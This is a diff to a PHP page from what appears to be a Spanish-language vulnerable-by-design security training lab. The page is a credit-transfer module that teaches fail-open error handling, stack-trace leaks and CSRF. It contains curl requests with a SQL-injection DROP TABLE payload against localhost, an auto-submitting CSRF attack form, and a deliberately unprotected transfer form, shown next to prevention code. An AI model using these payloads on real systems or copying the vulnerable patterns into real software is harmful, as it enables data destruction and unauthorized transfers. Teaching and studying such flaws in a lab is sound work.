@@ -15,6 +15,11 @@ session_start();
 $_SESSION['user_id'] = $_SESSION['user_id'] ?? 2;
 $_SESSION['username'] = $_SESSION['username'] ?? 'alice';
 
+// Generar token CSRF para la versión segura
+if (!isset($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
 require_once __DIR__ . '/../config/db.php';
 
 $pageTitle = 'Transferir Creditos - Nexo';
@@ -25,42 +30,43 @@ $labInfo = [
     'name' => 'Mishandling of Exceptional Conditions',
     'difficulty' => 'Avanzada',
     'description' => '
-        <p>El modulo de transferencias tiene <strong>dos vulnerabilidades</strong> en el manejo de errores:</p>
+        <p>El modulo de transferencias tiene <strong>tres vulnerabilidades</strong>:</p>
         <ol>
             <li><strong>Failing open:</strong> Si algo falla, responde "success" igual</li>
             <li><strong>Stack trace:</strong> Expone credenciales en errores</li>
+            <li><strong>CSRF (bonus):</strong> No valida origen del request</li>
         </ol>
-        <p class="mb-0">Ambos vienen de no disenar el manejo de excepciones con intencion.</p>
+        <p class="mb-0"><small>CSRF es historico (fuera del Top 10) pero pedagogicamente relevante.</small></p>
     ',
-    'exploit' => '# Failing open - enviar user_id invalido
+    'exploit' => '# 1. Failing open - enviar user_id invalido
 curl -X POST http://localhost:8082/a10_pagos/transferir.php \\
   -d "to_user=999&amount=100"
 # Responde "success" aunque el usuario no exista
 
-# Stack trace - provocar error de SQL
+# 2. Stack trace - provocar error de SQL
 curl -X POST http://localhost:8082/a10_pagos/transferir.php \\
   -d "to_user=\'; DROP TABLE wallets--&amount=100"
-# El stack trace muestra credenciales de la BD',
-    'prevention' => '// VULNERABLE:
-catch (Exception $e) {
-    http_response_code(200);
-    echo json_encode(["status" => "success"]);
-}
+# El stack trace muestra credenciales de la BD
 
-// SEGURO:
-catch (Exception $e) {
-    error_log("Transfer error: " . $e->getMessage());
-    http_response_code(500);
-    echo json_encode([
-        "status" => "error",
-        "message" => "No se pudo completar"
-    ]);
+# 3. CSRF - sitio malicioso auto-envia el form:
+&lt;form action=".../transferir.php" method="POST"&gt;
+  &lt;input name="to_user" value="666"&gt;
+  &lt;input name="amount" value="50000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;',
+    'prevention' => '// 1. Fail closed (no "success" en catch)
+// 2. Sin stack trace (log interno, msg generico)
+// 3. Token CSRF obligatorio:
+
+if (!hash_equals($_SESSION[\'csrf_token\'], $_POST[\'csrf_token\'])) {
+    http_response_code(403);
+    exit(json_encode(["error" => "CSRF invalid"]));
 }',
     'caseStudy' => [
         'title' => 'Knight Capital Group (2012)',
         'description' => 'Una excepcion no manejada en trading algoritmico causo compras/ventas erraticas por 45 minutos. Perdida: $440 millones. La empresa quebro dias despues.'
     ],
-    'cwes' => ['CWE-636', 'CWE-209', 'CWE-703'],
+    'cwes' => ['CWE-636', 'CWE-209', 'CWE-703', 'CWE-352'],
     'tools' => ['curl', 'Burp Suite'],
 ];
 
@@ -132,31 +138,84 @@ include __DIR__ . '/../shared/header.php';
                     <span class="badge bg-primary">Balance: $<?= number_format($balance, 0, ',', '.') ?></span>
                 </div>
                 <div class="card-body">
-                    <form action="transferir.php" method="POST" id="transferForm">
-                        <div class="mb-3">
-                            <label for="to_user" class="form-label">Destinatario</label>
-                            <select class="form-select" id="to_user" name="to_user" required>
-                                <option value="">Selecciona un usuario...</option>
-                                <?php foreach ($users as $user): ?>
-                                <option value="<?= $user['id'] ?>"><?= htmlspecialchars($user['username']) ?> (ID: <?= $user['id'] ?>)</option>
-                                <?php endforeach; ?>
-                                <option value="999">Usuario inexistente (ID: 999)</option>
-                            </select>
-                        </div>
-                        
-                        <div class="mb-3">
-                            <label for="amount" class="form-label">Monto</label>
-                            <div class="input-group">
-                                <span class="input-group-text">$</span>
-                                <input type="number" class="form-control" id="amount" name="amount" 
-                                       min="1" max="<?= $balance ?>" required>
+                    <!-- Tabs para elegir version -->
+                    <ul class="nav nav-tabs mb-3" role="tablist">
+                        <li class="nav-item">
+                            <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#vulnerable" type="button">
+                                <span class="text-danger">🔓 Vulnerable</span>
+                            </button>
+                        </li>
+                        <li class="nav-item">
+                            <button class="nav-link" data-bs-toggle="tab" data-bs-target="#seguro" type="button">
+                                <span class="text-success">🔒 Seguro</span>
+                            </button>
+                        </li>
+                    </ul>
+                    
+                    <div class="tab-content">
+                        <!-- Form VULNERABLE (sin CSRF token) -->
+                        <div class="tab-pane fade show active" id="vulnerable">
+                            <div class="alert alert-danger small py-2">
+                                <strong>Sin proteccion CSRF</strong> — Un sitio malicioso podria enviar este form.
                             </div>
+                            <form action="transferir.php" method="POST" id="transferFormVuln">
+                                <div class="mb-3">
+                                    <label for="to_user_vuln" class="form-label">Destinatario</label>
+                                    <select class="form-select" id="to_user_vuln" name="to_user" required>
+                                        <option value="">Selecciona un usuario...</option>
+                                        <?php foreach ($users as $user): ?>
+                                        <option value="<?= $user['id'] ?>"><?= htmlspecialchars($user['username']) ?> (ID: <?= $user['id'] ?>)</option>
+                                        <?php endforeach; ?>
+                                        <option value="999">Usuario inexistente (ID: 999)</option>
+                                    </select>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="amount_vuln" class="form-label">Monto</label>
+                                    <div class="input-group">
+                                        <span class="input-group-text">$</span>
+                                        <input type="number" class="form-control" id="amount_vuln" name="amount" 
+                                               min="1" max="<?= $balance ?>" required>
+                                    </div>
+                                </div>
+                                <button type="submit" class="btn btn-danger w-100">
+                                    Transferir (vulnerable)
+                                </button>
+                            </form>
                         </div>
                         
-                        <button type="submit" class="btn btn-primary w-100">
-                            Transferir
-                        </button>
-                    </form>
+                        <!-- Form SEGURO (con CSRF token) -->
+                        <div class="tab-pane fade" id="seguro">
+                            <div class="alert alert-success small py-2">
+                                <strong>Con token CSRF</strong> — Solo acepta requests de este formulario.
+                                <br><code class="small">Token: <?= substr($_SESSION['csrf_token'], 0, 16) ?>...</code>
+                            </div>
+                            <form action="transferir_secure.php" method="POST" id="transferFormSecure">
+                                <!-- Token CSRF oculto -->
+                                <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($_SESSION['csrf_token']) ?>">
+                                
+                                <div class="mb-3">
+                                    <label for="to_user_sec" class="form-label">Destinatario</label>
+                                    <select class="form-select" id="to_user_sec" name="to_user" required>
+                                        <option value="">Selecciona un usuario...</option>
+                                        <?php foreach ($users as $user): ?>
+                                        <option value="<?= $user['id'] ?>"><?= htmlspecialchars($user['username']) ?> (ID: <?= $user['id'] ?>)</option>
+                                        <?php endforeach; ?>
+                                    </select>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="amount_sec" class="form-label">Monto</label>
+                                    <div class="input-group">
+                                        <span class="input-group-text">$</span>
+                                        <input type="number" class="form-control" id="amount_sec" name="amount" 
+                                               min="1" max="<?= $balance ?>" required>
+                                    </div>
+                                </div>
+                                <button type="submit" class="btn btn-success w-100">
+                                    Transferir (seguro)
+                                </button>
+                            </form>
+                        </div>
+                    </div>
                 </div>
             </div>
 
@@ -217,15 +276,25 @@ include __DIR__ . '/../shared/header.php';
                     Pistas del lab
                 </div>
                 <div class="card-body small">
-                    <h6>Failing Open:</h6>
-                    <p>Selecciona "Usuario inexistente (ID: 999)" y envia la transferencia. 
-                    El sistema respondera "success" aunque el usuario no exista.</p>
+                    <h6>1. Failing Open:</h6>
+                    <p>Selecciona "Usuario inexistente (ID: 999)" y envia con el form vulnerable. 
+                    Respondera "success" aunque el usuario no exista.</p>
                     
-                    <h6>Stack Trace:</h6>
-                    <p class="mb-0">Usa curl para enviar un payload malicioso:</p>
-                    <pre class="bg-light p-2 mt-2"><code>curl -X POST \
-  http://localhost:8082/a10_pagos/transferir.php \
-  -d "to_user='; DROP TABLE--&amount=100"</code></pre>
+                    <h6>2. Stack Trace:</h6>
+                    <pre class="bg-light p-2"><code>curl -X POST \
+  localhost:8082/a10_pagos/transferir.php \
+  -d "to_user='; DROP--&amount=100"</code></pre>
+                    
+                    <h6>3. CSRF:</h6>
+                    <p class="mb-1">Crea un HTML con este form y abrilo:</p>
+                    <pre class="bg-light p-2"><code>&lt;form action="http://localhost:8082
+  /a10_pagos/transferir.php" 
+  method="POST"&gt;
+  &lt;input name="to_user" value="1"&gt;
+  &lt;input name="amount" value="100"&gt;
+  &lt;button&gt;Click&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+                    <p class="mb-0 text-muted">Si tenes sesion activa, transfiere sin tu consentimiento.</p>
                 </div>
             </div>
             
